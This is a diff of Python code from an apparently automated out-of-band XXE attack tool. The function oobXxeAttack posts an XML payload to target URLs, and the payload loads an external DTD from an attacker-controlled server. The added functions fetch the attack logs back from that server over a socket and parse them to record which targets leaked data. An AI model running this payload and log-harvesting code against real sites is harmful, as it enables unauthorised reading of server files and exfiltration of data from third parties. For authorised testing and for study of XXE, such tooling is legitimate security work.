@@ -116,3 +116,65 @@ def oobXxeAttack(target_urls : list , attacker_server : str):
         payload = '<?xml version=\"1.0\" ?>\r\n<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{}exploit/exploit5.dtd"> %xxe; ]>'.format(attacker_server)
         response = session.post(target_url, data = payload, headers = headers)
             
+# routine : 공격자 서버에서 공격 log 를 받아옴 
+# argument : None
+# return value : 로그를 string 형태로 반환 ( 필터링되지 않은 상태 )
+
+def resultRequest():
+    sendMsg(client_socket, "result".encode("utf-8"))
+    data = getMsg(client_socket)
+    sendMsg(client_socket, data)
+    data_transferred = 0 
+    result = str()
+
+
+    if data == None:
+        print("\n\n   [ ERROR : File does not exist in server ] \n\n")
+        return "RESULT_ERROR"
+
+    
+    try:
+        while data:
+            result += repr(data)
+            data_transferred += len(data)
+            data = getMsg(client_socket).decode("utf-8")
+            sendMsg(client_socket, data.encode("utf-8"))
+            if(data == "end"):
+                break
+    except Exception as ex:
+            print("\n\n   [ ERROR : ", ex ," ]  \n\n")
+            return "RESULT_ERROR"
+
+
+    #print("\n\n** [ LOG ] Size of transferred data  : {} bytes \n\n".format(data_transferred))
+    craftResult(result)
+
+def craftResult(result : str):
+    result = '"""{}"""'.format(result)    
+    new_schema = schema("OOB")     
+    result = result.split("\\n")
+    url = str()
+
+    for line in result:
+        try:
+            if( int(line.split(' ')[8]) != 404):
+                continue
+        except:
+            continue
+
+
+        line = re.sub("''","",line)
+        if(line.find('/exploit/') != -1) : 
+            new_schema.setContent(line[line.find('/exploit/'):line.find('http/1.1')])
+        else :
+            if(new_schema.url) :
+                count_use = new_schema.content.count('\n')
+                new_schema.setisHackOob(count_use)
+                insertItem(new_schema)
+
+                new_schema = schema("OOB")
+            new_schema.setUrl(line[line.find('/url') + 5:])
+
+    count_use = new_schema.content.count('\n')
+    new_schema.setisHackOob(count_use)
+    insertItem(new_schema)
